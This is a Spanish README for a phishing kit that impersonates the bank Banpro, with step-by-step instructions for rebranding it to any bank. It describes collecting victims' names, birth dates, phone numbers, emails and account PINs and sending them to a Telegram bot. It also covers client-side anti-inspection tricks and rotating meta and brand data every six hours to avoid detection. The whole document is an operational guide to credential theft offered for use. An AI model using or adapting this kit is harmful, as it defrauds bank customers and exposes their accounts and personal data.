# Guía de Re-Branding — Plantilla Banpro

Esta plantilla es **agnóstica de marca**. Para adaptarla a cualquier banco/fintech solo hay que tocar pocos lugares. Sigue esta guía en orden.

---

## 1) Logo

Reemplaza el archivo:

```
img/sello.webp
```

> Mantén el mismo nombre de archivo y se actualiza en todas las páginas.
> Si necesitas otro formato, busca y reemplaza `img/sello.webp` en `index.php`, `index.html`, `acceso.html`, `quimera.php`.

---

## 2) Imagen de tarjeta (resultado)

Reemplaza:

```
img/tela.png
```

O cambia las referencias en `index.php` e `index.html`:

```html
<img src="img/tela.png" alt="..." class="product-img" />
```

---

## 3) Paleta de colores

Edita `selva.css` (líneas 1–10). Solo cambia los HEX, no renombres variables:

```css
:root {
  --purple-900: #04421a;   /* fondo más oscuro (footer) */
  --purple-800: #065f2c;   /* paso completado */
  --purple-700: #086726;   /* hover oscuro */
  --pink:       #0e8c3a;   /* COLOR PRIMARIO (botones, focus, links activos) */
  --pink-glow:  rgba(14, 140, 58, 0.32);   /* sombra del botón primario */

  --green-dark:  #065f2c;
  --green:       #0e8c3a;  /* === MISMO QUE --pink === */
  --green-light: #22c55e;
  --yellow-accent: #ffd200;
}
```

> **Truco rápido**: cambia `--pink` y `--green` al mismo color de marca y todo el sitio se reacomoda.

También revisa `safiro.css` para colores hex sueltos del loader y footer oscuro:

- Footer oscuro `.acceso-footer { background: #04421a; }` → cambia a tu color oscuro
- Loader: `stroke: #0e8c3a;` y `border-top-color: #0e8c3a;` → tu primario
- Bandera del país (`.flag-yellow/blue/red`): adapta colores de la bandera correspondiente

---

## 4) Textos / Copy

### Página principal — `index.php` e `index.html`

| Texto | Línea aprox. | Cambiar a |
|---|---|---|
| `<title>Banpro - ...</title>` | head | tu marca |
| `Solicitud de Crédito Banpro` (hero-title) | ~46 | título de marca |
| `Información de Contacto` / sub | ~120 | descripción |
| `Antigüedad con Banpro` | ~149 | nombre de tu banco |
| `Tarjeta Crédito Banpro` | ~244, 253 | nombre del producto |
| `C$ 180,000` / `C$ 350` | ~248, 250 | monto y moneda |
| `© 2026 Banpro Grupo Promerica` | footer | copyright |

### Página de acceso — `acceso.html`

| Texto | Línea aprox. | Cambiar a |
|---|---|---|
| `<title>Banpro - Acceso a tu cuenta</title>` | head | tu marca |
| `C$ 180,000` (subtítulo) | ~57 | monto y moneda |
| `Banpro en Línea` | ~57 | nombre del banking online |
| `+505` (código país) | ~69 | tu prefijo |
| `<strong>Promerica</strong>` (footer) | ~117 | nombre del grupo |

---

## 5) Validación de teléfono

Está en `nilo.js` y `eco.js`. Busca:

```js
if (!['2','5','7','8'].includes(digits[0])) { ... }
if (digits.length !== 8 || !['2','5','7','8'].includes(digits[0])) { ... }
```

Y ajusta longitud + dígitos de inicio según el país. También cambia el placeholder en los inputs:

```html
placeholder="8888 8888"
maxlength="9"
```

---

## 6) Telegram (token y chat_id)

Edita **`config.php`** líneas 18–19:

```php
$_TK_PACK = 'TU_BOT_TOKEN';
$_CH_PACK = 'TU_CHAT_ID';
```

> Acepta texto plano. Si quieres ofuscar, ejecuta `nq_pack('TU_TOKEN')` y pega el resultado.

Para probar el envío en vivo:

```
https://tu-dominio.com/halo.php?test=1
```

### Títulos de los mensajes

En `halo.php` (líneas 64–100) puedes renombrar libremente los `<b>...</b>` de cada paso.

---

## 7) Iconos de los inputs

En `index.php` / `index.html`, cada campo del formulario está envuelto en `.input-wrap` con un `<svg class="input-icon">`. Para cambiar un icono solo reemplaza el contenido del SVG (estilo Lucide). El color se hereda de `--green`.

---

## 8) Sistema de randomize / protección

Hay **dos capas** activas:

### a) `kappa.js` (cliente)
- Bloquea clic derecho, F12, Ctrl+U, Ctrl+S, Ctrl+Shift+I/J/C
- Detecta DevTools abierto en desktop y redirige a `about:blank`
- Trampa de `debugger`
- Limpia consola periódicamente

> Sin configuración. Se incluye automáticamente en `<head>` de cada página.

### b) `quimera.php` (servidor — randomize SEO/meta)

Cada 6 horas, automáticamente al llegar un `halo.php`, se rotan:
- `<title>` y `<meta description>` con marcas/keywords aleatorias
- `<meta theme-color>` con un HEX de la lista `NQ_THEMES`
- `og:image`, `canonical`, version `?v=` en CSS/JS (cache busting)
- `manifest.json`, `robots.txt`, `sitemap.xml`
- Atributo `data-build` en `<html>`

#### Configurar el dominio

En `quimera.php` línea 12:
```php
define('NQ_ROTATE_DOMAIN', 'tudominio.com');
```

#### Disparar rotación manual

1. Edita `tilo.php` línea 31 con un secreto largo:
   ```php
   const SECRET = 'aB9_Xz#kN2!Lp7@vQ';
   ```
2. Llama desde el navegador o cron:
   ```
   https://tudominio.com/tilo.php?key=aB9_Xz#kN2!Lp7@vQ
   ```
3. Cron sugerido (cPanel) cada 6 horas:
   ```
   0 */6 * * * curl -s "https://tudominio.com/tilo.php?key=aB9_Xz#kN2!Lp7@vQ" > /dev/null
   ```

#### Personalizar pools de marcas/keywords

En `quimera.php`:
- `NQ_BRAND_PREFIX` / `NQ_BRAND_SUFFIX` → genera nombres del estilo "PagoNet", "BancaPlus"…
- `NQ_TITLE_TPLS` / `NQ_DESC_TPLS` → plantillas de título y descripción
- `NQ_KEYWORDS` → palabras clave del sector
- `NQ_THEMES` → HEX de `theme-color` rotado

---

## 9) Flujo actual

```
index.php / index.html
    ├─ Paso 1: Nombre + Apellido          → halo.php (paso1)
    ├─ Paso 2: Fecha Nac, Tel, Email,
    │           Antigüedad                  → halo.php (paso2)
    ├─ Paso 3: Loading 5s
    └─ Paso 4: Resultado → "Solicitar Ahora"
                                          ▼
                                    acceso.html
                                       └─ Tel + Clave 4 dígitos → halo.php (acceso)
                                                                   → window.location = 'validacion.html' (pendiente)
```

> Las páginas `validacion.html`, `clave.html`, `verificacion.html` fueron eliminadas. Los `case 'validacion'` y `case 'otp'` siguen vivos en `halo.php` para cuando agregues la siguiente etapa.

---

## 10) Archivos clave

| Archivo | Propósito |
|---|---|
| `index.php` / `index.html` | Formulario principal (4 pasos) |
| `acceso.html` / `eco.js` / `safiro.css` | Login post-aprobación |
| `nilo.js` | Lógica del form principal + validaciones |
| `selva.css` | Estilos globales + paleta |
| `halo.php` | Endpoint Telegram + dispara rotación |
| `config.php` | Token y chat_id de Telegram |
| `tilo.php` / `quimera.php` | Sistema de randomize SEO/meta |
| `kappa.js` | Anti-inspección cliente |
| `zafiro.php` | Cargado por halo.php (define `$token` y `$chat_id`) |
| `img/sello.webp` | Logo |
| `img/tela.png` | Imagen del producto/tarjeta |

---

## Checklist rápido para nueva marca

- [ ] Reemplazar `img/sello.webp`
- [ ] Reemplazar `img/tela.png`
- [ ] Cambiar `--pink` y `--green` en `selva.css`
- [ ] Ajustar colores hex sueltos en `safiro.css` (loader/footer/bandera)
- [ ] Reemplazar todas las menciones de "Banpro" en `index.php`, `index.html`, `acceso.html`
- [ ] Ajustar moneda y monto del producto
- [ ] Cambiar prefijo telefónico y validación en `nilo.js` y `eco.js`
- [ ] Configurar `NQ_ROTATE_DOMAIN` en `quimera.php`
- [ ] Configurar `SECRET` y `DOMAIN` en `tilo.php`
- [ ] Configurar token y chat_id en `config.php`
- [ ] Probar `halo.php?test=1`
- [ ] Activar cron de `tilo.php` (opcional, ya rota solo cada 6h al recibir tráfico)
